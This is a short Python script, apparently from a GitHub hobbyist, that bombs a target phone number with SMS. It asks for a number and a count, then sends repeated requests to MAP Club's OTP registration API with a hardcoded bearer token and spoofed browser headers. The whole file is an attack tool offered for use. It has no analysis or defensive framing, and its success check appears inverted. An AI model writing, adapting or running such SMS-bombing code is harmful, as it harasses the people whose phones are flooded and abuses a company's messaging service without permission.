import requests
import json
import os
import time
from requests import post

os.system("clear")
os.system("figlet Zendot-H")
time.sleep(1)

banner="""
\t  Spam SMS
--------------------------------------

[+]Author: Zendot-H
[+]Github: https://github.com/Zaeni123
----------------------------------------
"""



print(banner)

nomor=input("Masukkan Nomor Target(08): ")
jumlah=int(input("Jumlah: "))
print()

headers={
"Host":"beryllium.mapclub.com",
"content-length":"24",
"client-platform":"WEB",
"client-timestamp":"1629017047573",
"authorization":"Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIzMmVmODZjMy01YmNjLTRiMjUtOWIyOC02Njg3YmQ5Y2MwNWQiLCJleHBpcmVkIjoxNjI5MDIwNjE3MzM1LCJleHBpcmUiOjM2MDAsImV4cCI6MTYyOTAyMDYxNywiaWF0IjoxNjI5MDE3MDE3LCJwbGF0Zm9ybSI6IldFQJ9.1jcjv77xteNP2EpxsiC6d5SIHYKBQHo_hMMDFuOLr4s2M_9r5V0RLjNLz0SVq-SdzJIo2kLhvsNXgm0OGjf91g",
"accept":"application/json, text/plain, */*",
"content-type":"application/json",
"accept-language":"en-US",
"user-agent":"Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36",
"save-data":"on",
"origin":"https://www.mapclub.com",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://www.mapclub.com/",
"accept-encoding":"gzip, deflate, br",
}
data={
"msisdn":nomor,
}
for i in range(int(jumlah)):
        respon=requests.post("https://beryllium.mapclub.com/api/sms/otp/registration",headers=headers,json=data)
        zen=json.loads(respon.text)

if zen["success"]==False:
         print('Spam sms sukses')

else:
         print("Spam sms gagal!!")